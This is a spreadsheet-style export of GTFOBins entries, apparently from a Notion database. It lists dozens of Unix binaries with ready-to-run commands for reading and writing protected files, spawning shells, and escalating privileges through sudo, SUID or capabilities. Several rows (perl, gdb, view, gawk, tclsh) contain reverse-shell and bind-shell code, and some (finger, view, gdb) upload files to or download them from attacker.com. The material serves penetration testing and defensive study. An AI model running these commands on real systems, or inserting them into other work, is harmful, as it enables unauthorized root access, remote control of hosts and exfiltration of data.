Tools,Service,Port,Syntax & Description,Tags,MITRE ATT&CK
https://www.notion.so7z.md,GTFOBins,,"file-read: LFILE=file_to_read
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so

sudo: LFILE=file_to_read
sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soxz.md,GTFOBins,,"file-read: LFILE=file_to_read
xz -c ""$LFILE"" | xz -d

suid: LFILE=file_to_read
./xz -c ""$LFILE"" | xz -d

sudo: LFILE=file_to_read
sudo xz -c ""$LFILE"" | xz -d","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sobase64.md,GTFOBins,,"file-read: LFILE=file_to_read
base64 ""$LFILE"" | base64 --decode

suid: LFILE=file_to_read
./base64 ""$LFILE"" | base64 --decode

sudo: LFILE=file_to_read
sudo base64 ""$LFILE"" | base64 --decode","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sow3m.md,GTFOBins,,"file-read: LFILE=file_to_read
w3m ""$LFILE"" -dump

suid: LFILE=file_to_read
./w3m ""$LFILE"" -dump

sudo: LFILE=file_to_read
sudo w3m ""$LFILE"" -dump","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopdftex.md,GTFOBins,,"shell: pdftex --shell-escape '\write18{/bin/sh}\end'

sudo: sudo pdftex --shell-escape '\write18{/bin/sh}\end'

limited-suid: ./pdftex --shell-escape '\write18{/bin/sh}\end'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soxelatex.md,GTFOBins,,"shell: xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'

file-read: xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi

sudo: sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi

sudo: sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'

limited-suid: ./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socolumn.md,GTFOBins,,"file-read: LFILE=file_to_read
column $LFILE

suid: LFILE=file_to_read
./column $LFILE

sudo: LFILE=file_to_read
sudo column $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soln.md,GTFOBins,,"sudo: sudo ln -fs /bin/sh /bin/ln
sudo ln","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sorsync.md,GTFOBins,,"shell: rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null
sudo: sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null
suid: ./rsync -e 'sh -p -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sorlwrap.md,GTFOBins,,"shell: rlwrap /bin/sh
file-write: LFILE=file_to_write
rlwrap -l ""$LFILE"" echo DATA

suid: ./rlwrap -H /dev/null /bin/sh -p
sudo: sudo rlwrap /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soyash.md,GTFOBins,,"shell: yash
suid: ./yash
sudo: sudo yash","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sofinger.md,GTFOBins,,"file-upload: RHOST=attacker.com
LFILE=file_to_send
finger ""$(base64 $LFILE)@$RHOST""

file-download: RHOST=attacker.com
LFILE=file_to_save
finger x@$RHOST | base64 -d > ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sochmod.md,GTFOBins,,"suid: LFILE=file_to_change
./chmod 6777 $LFILE

sudo: LFILE=file_to_change
sudo chmod 6777 $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sominicom.md,GTFOBins,,"shell: minicom -D /dev/null

shell: TF=$(mktemp)
echo ""! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)"" >$TF
minicom -D /dev/null -S $TF
reset^J

sudo: sudo minicom -D /dev/null

suid: ./minicom -D /dev/null","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socheck_raid.md,GTFOBins,,"file-read: LFILE=file_to_read
check_raid --extra-opts=@$LFILE

sudo: LFILE=file_to_read
sudo check_raid --extra-opts=@$LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soknife.md,GTFOBins,,"shell: knife exec -E 'exec ""/bin/sh""'

sudo: sudo knife exec -E 'exec ""/bin/sh""'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soxxd.md,GTFOBins,,"file-write: LFILE=file_to_write
echo DATA | xxd | xxd -r - ""$LFILE""

file-read: LFILE=file_to_read
xxd ""$LFILE"" | xxd -r

suid: LFILE=file_to_read
./xxd ""$LFILE"" | xxd -r

sudo: LFILE=file_to_read
sudo xxd ""$LFILE"" | xxd -r","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sodmsetup.md,GTFOBins,,"sudo: sudo dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
sudo dmsetup ls --exec '/bin/sh -s'

suid: ./dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
./dmsetup ls --exec '/bin/sh -p -s'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sounzip.md,GTFOBins,,"sudo: sudo unzip -K shell.zip
./sh -p

suid: ./unzip -K shell.zip
./sh -p","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotclsh.md,GTFOBins,,"shell: tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr

non-interactive-reverse-shell: export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh

suid: ./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr

sudo: sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sojournalctl.md,GTFOBins,,"shell: journalctl
!/bin/sh

sudo: sudo journalctl
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sobpftrace.md,GTFOBins,,"sudo: sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'
sudo: TF=$(mktemp)
echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
sudo bpftrace $TF

sudo: sudo bpftrace -c /bin/sh -e 'END {exit()}'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socomposer.md,GTFOBins,,"shell: TF=$(mktemp -d)
echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
composer --working-dir=$TF run-script x

limited-suid: TF=$(mktemp -d)
echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
./composer --working-dir=$TF run-script x

sudo: TF=$(mktemp -d)
echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sogawk.md,GTFOBins,,"shell: gawk 'BEGIN {system(""/bin/sh"")}'
non-interactive-reverse-shell: RHOST=attacker.com
RPORT=12345
gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'

non-interactive-bind-shell: LPORT=12345
gawk -v LPORT=$LPORT 'BEGIN {
    s = ""/inet/tcp/"" LPORT ""/0/0"";
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'

file-write: LFILE=file_to_write
gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'

file-read: LFILE=file_to_read
gawk '//' ""$LFILE""

suid: LFILE=file_to_read
./gawk '//' ""$LFILE""

sudo: sudo gawk 'BEGIN {system(""/bin/sh"")}'
limited-suid: ./gawk 'BEGIN {system(""/bin/sh"")}'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sologsave.md,GTFOBins,,"shell: logsave /dev/null /bin/sh -i
sudo: sudo logsave /dev/null /bin/sh -i
suid: ./logsave /dev/null /bin/sh -i -p","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soip.md,GTFOBins,,"file-read: LFILE=file_to_read
ip -force -batch ""$LFILE""

suid: LFILE=file_to_read
./ip -force -batch ""$LFILE""

suid: ./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo

sudo: LFILE=file_to_read
sudo ip -force -batch ""$LFILE""

sudo: sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo

sudo: sudo ip netns add foo
sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
sudo ip netns exec bar /bin/sh
sudo ip netns delete foo
sudo ip netns delete bar","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosoelim.md,GTFOBins,,"file-read: LFILE=file_to_read
soelim ""$LFILE""

suid: LFILE=file_to_read
./soelim ""$LFILE""

sudo: LFILE=file_to_read
sudo soelim ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soyelp.md,GTFOBins,,"file-read: LFILE=file_to_read
yelp ""man:$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soaws.md,GTFOBins,,"shell: aws help
!/bin/sh

sudo: sudo aws help
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sounexpand.md,GTFOBins,,"file-read: LFILE=file_to_read
unexpand -t99999999 ""$LFILE""

suid: LFILE=file_to_read
./unexpand -t99999999 ""$LFILE""

sudo: LFILE=file_to_read
sudo unexpand -t99999999 ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socapsh.md,GTFOBins,,"shell: capsh --
suid: ./capsh --gid=0 --uid=0 --
sudo: sudo capsh --","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sontpdate.md,GTFOBins,,"file-read: LFILE=file_to_read
ntpdate -a x -k $LFILE -d localhost

sudo: LFILE=file_to_read
sudo ntpdate -a x -k $LFILE -d localhost

suid: LFILE=file_to_read
./ntpdate -a x -k $LFILE -d localhost","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soview.md,GTFOBins,,"shell: view -c ':!/bin/sh'
shell: view
:set shell=/bin/sh
:shell

shell: view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
shell: view -c ':lua os.execute(""reset; exec sh"")'
reverse-shell: export RHOST=attacker.com
export RPORT=12345
view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'

non-interactive-reverse-shell: export RHOST=attacker.com
export RPORT=12345
view -c ':lua local s=require(""socket""); local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));t:send(b);
  end;
  f:close();t:close();'

non-interactive-bind-shell: export LPORT=12345
view -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'

file-upload: export URL=http://attacker.com/
export LFILE=file_to_send
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'

file-upload: export LPORT=8888
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'

file-upload: export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
view -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
  local d=f:read(""*a"")
  io.close(f);
  local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  t:send(d);
  t:close();'

file-download: export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'

file-download: export LPORT=12345
export LFILE=file_to_save
view -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(os.getenv(""LFILE""), ""wb"");
  f:write(d);
  io.close(f);'

file-write: view file_to_write
iDATA
^[
w!

file-read: view file_to_read
library-load: view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'
suid: ./view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'
sudo: sudo view -c ':!/bin/sh'
sudo: sudo view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
sudo: sudo view -c ':lua os.execute(""reset; exec sh"")'
capabilities: ./view -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
limited-suid: ./view -c ':lua os.execute(""reset; exec sh"")'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socp.md,GTFOBins,,"file-read: LFILE=file_to_read
cp ""$LFILE"" /dev/stdout

file-write: LFILE=file_to_write
echo ""DATA"" | cp /dev/stdin ""$LFILE""

suid: LFILE=file_to_write
echo ""DATA"" | ./cp /dev/stdin ""$LFILE""

suid: LFILE=file_to_write
TF=$(mktemp)
echo ""DATA"" > $TF
./cp $TF $LFILE

suid: LFILE=file_to_change
./cp --attributes-only --preserve=all ./cp ""$LFILE""

sudo: LFILE=file_to_write
echo ""DATA"" | sudo cp /dev/stdin ""$LFILE""

sudo: LFILE=file_to_write
TF=$(mktemp)
echo ""DATA"" > $TF
sudo cp $TF $LFILE

sudo: sudo cp /bin/sh /bin/cp
sudo cp","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soperl.md,GTFOBins,,"shell: perl -e 'exec ""/bin/sh"";'
file-read: LFILE=file_to_read
perl -ne print $LFILE

reverse-shell: export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'

suid: ./perl -e 'exec ""/bin/sh"";'
sudo: sudo perl -e 'exec ""/bin/sh"";'
capabilities: ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somsguniq.md,GTFOBins,,"file-read: LFILE=file_to_read
msguniq -P $LFILE

sudo: LFILE=file_to_read
sudo msguniq -P $LFILE

suid: LFILE=file_to_read
./msguniq -P $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopdflatex.md,GTFOBins,,"shell: pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'

file-read: pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -

sudo: sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -

sudo: sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'

limited-suid: ./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soncftp.md,GTFOBins,,"shell: ncftp
!/bin/sh

suid: ./ncftp
!/bin/sh -p

sudo: sudo ncftp
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopkg.md,GTFOBins,,sudo: sudo pkg install -y --no-repo-update ./x-1.0.txz,"GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotroff.md,GTFOBins,,"file-read: LFILE=file_to_read
troff $LFILE

suid: LFILE=file_to_read
./troff $LFILE

sudo: LFILE=file_to_read
sudo troff $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soexpand.md,GTFOBins,,"file-read: LFILE=file_to_read
expand ""$LFILE""

suid: LFILE=file_to_read
./expand ""$LFILE""

sudo: LFILE=file_to_read
sudo expand ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopsql.md,GTFOBins,,"shell: psql
\?
!/bin/sh

sudo: psql
\?
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sodnf.md,GTFOBins,,sudo: sudo dnf install -y x-1.0-1.noarch.rpm,"GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sogdb.md,GTFOBins,,"shell: gdb -nx -ex '!sh' -ex quit
reverse-shell: export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' -ex quit

file-upload: export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit

file-upload: export LPORT=8888
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit

file-download: export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit

file-write: LFILE=file_to_write
gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit

file-read: gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit
library-load: gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit
suid: ./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit
sudo: sudo gdb -nx -ex '!sh' -ex quit
capabilities: ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sonasm.md,GTFOBins,,"file-read: LFILE=file_to_read
nasm -@ $LFILE

suid: LFILE=file_to_read
./nasm -@ $LFILE

sudo: LFILE=file_to_read
sudo nasm -@ $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socsh.md,GTFOBins,,"shell: csh
file-write: export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'

suid: ./csh -b
sudo: sudo csh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopkexec.md,GTFOBins,,sudo: sudo pkexec /bin/sh,"GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sozsoelim.md,GTFOBins,,"file-read: LFILE=file_to_read
zsoelim ""$LFILE""

suid: LFILE=file_to_read
./zsoelim ""$LFILE""

sudo: LFILE=file_to_read
sudo zsoelim ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socheck_ssl_cert.md,GTFOBins,,"command: COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT

sudo: COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
umask 022
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soc89.md,GTFOBins,,"file-read: LFILE=file_to_read
c89 -x c -E ""$LFILE""

file-write: LFILE=file_to_delete
c89 -xc /dev/null -o $LFILE

shell: c89 -wrapper /bin/sh,-s .
sudo: sudo c89 -wrapper /bin/sh,-s .","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socheck_statusfile.md,GTFOBins,,"file-read: LFILE=file_to_read
check_statusfile $LFILE

sudo: LFILE=file_to_read
sudo check_statusfile $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sovagrant.md,GTFOBins,,"shell: cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up

sudo: cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up

suid: cd $(mktemp -d)
echo 'exec ""/bin/sh -p""' > Vagrantfile
vagrant up","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socupsfilter.md,GTFOBins,,"file-read: LFILE=file_to_read
cupsfilter -i application/octet-stream -m application/octet-stream $LFILE

sudo: LFILE=file_to_read
sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE

suid: LFILE=file_to_read
./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotasksh.md,GTFOBins,,"shell: tasksh
!/bin/sh

limited-suid: ./tasksh
!/bin/sh

sudo: sudo tasksh
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somsgconv.md,GTFOBins,,"file-read: LFILE=file_to_read
msgconv -P $LFILE

sudo: LFILE=file_to_read
sudo msgconv -P $LFILE

suid: LFILE=file_to_read
./msgconv -P $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sobatcat.md,GTFOBins,,"shell: batcat --paging always /etc/profile
!/bin/sh

limited-suid: ./batcat --paging always /etc/profile
!/bin/sh

sudo: sudo batcat --paging always /etc/profile
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somv.md,GTFOBins,,"suid: LFILE=file_to_write
TF=$(mktemp)
echo ""DATA"" > $TF
./mv $TF $LFILE

sudo: LFILE=file_to_write
TF=$(mktemp)
echo ""DATA"" > $TF
sudo mv $TF $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sobridge.md,GTFOBins,,"file-read: LFILE=file_to_read
bridge -b ""$LFILE""

suid: LFILE=file_to_read
./bridge -b ""$LFILE""

sudo: LFILE=file_to_read
sudo bridge -b ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soman.md,GTFOBins,,"shell: man man
!/bin/sh

shell: man '-H/bin/sh #' man

file-read: man file_to_read
sudo: sudo man man
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sobase32.md,GTFOBins,,"file-read: LFILE=file_to_read
base32 ""$LFILE"" | base32 --decode

suid: LFILE=file_to_read
base32 ""$LFILE"" | base32 --decode

sudo: LFILE=file_to_read
sudo base32 ""$LFILE"" | base32 --decode","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somount.md,GTFOBins,,"sudo: sudo mount -o bind /bin/sh /bin/mount
sudo mount","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soopkg.md,GTFOBins,,sudo: sudo opkg install x_1.0_all.deb,"GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sood.md,GTFOBins,,"file-read: LFILE=file_to_read
od -An -c -w9999 ""$LFILE""

suid: LFILE=file_to_read
./od -An -c -w9999 ""$LFILE""

sudo: LFILE=file_to_read
sudo od -An -c -w9999 ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopuppet.md,GTFOBins,,"shell: puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""

file-write: LFILE=""/tmp/file_to_write""
puppet apply -e ""file { '$LFILE': content => 'DATA' }""

file-read: LFILE=file_to_read
puppet filebucket -l diff /dev/null $LFILE

sudo: sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socowthink.md,GTFOBins,,"shell: TF=$(mktemp)
echo 'exec ""/bin/sh"";' >$TF
cowthink -f $TF x

sudo: TF=$(mktemp)
echo 'exec ""/bin/sh"";' >$TF
sudo cowthink -f $TF x","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotorsocks.md,GTFOBins,,"shell: torsocks /bin/sh
sudo: sudo torsocks /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sofish.md,GTFOBins,,"shell: fish
suid: ./fish
sudo: sudo fish","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotime.md,GTFOBins,,"shell: /usr/bin/time /bin/sh
suid: ./time /bin/sh -p
sudo: sudo /usr/bin/time /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socpulimit.md,GTFOBins,,"shell: cpulimit -l 100 -f /bin/sh
suid: ./cpulimit -l 100 -f -- /bin/sh -p
sudo: sudo cpulimit -l 100 -f /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socrontab.md,GTFOBins,,"command: crontab -e
sudo: sudo crontab -e","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somysql.md,GTFOBins,,"shell: mysql -e '\! /bin/sh'
sudo: sudo mysql -e '\! /bin/sh'
limited-suid: ./mysql -e '\! /bin/sh'
library-load: mysql --default-auth ../../../../../path/to/lib","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soscrot.md,GTFOBins,,"shell: scrot -e /bin/sh
limited-suid: ./scrot -e /bin/sh
sudo: sudo scrot -e /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopexec.md,GTFOBins,,"shell: pexec /bin/sh
suid: ./pexec /bin/sh -p
sudo: sudo pexec /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soginsh.md,GTFOBins,,"shell: ginsh
!/bin/sh

limited-suid: ./ginsh
!/bin/sh

sudo: sudo ginsh
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soopenvpn.md,GTFOBins,,"shell: openvpn --dev null --script-security 2 --up '/bin/sh -c sh'

file-read: LFILE=file_to_read
openvpn --config ""$LFILE""

suid: ./openvpn --dev null --script-security 2 --up '/bin/sh -p -c ""sh -p""'

suid: LFILE=file_to_read
./openvpn --config ""$LFILE""

sudo: sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'

sudo: LFILE=file_to_read
sudo openvpn --config ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sodd.md,GTFOBins,,"file-write: LFILE=file_to_write
echo ""DATA"" | dd of=$LFILE

file-read: LFILE=file_to_read
dd if=$LFILE

suid: LFILE=file_to_write
echo ""data"" | ./dd of=$LFILE

sudo: LFILE=file_to_write
echo ""data"" | sudo dd of=$LFILE","GTFOBins, LOTL (Living Off The Land)",
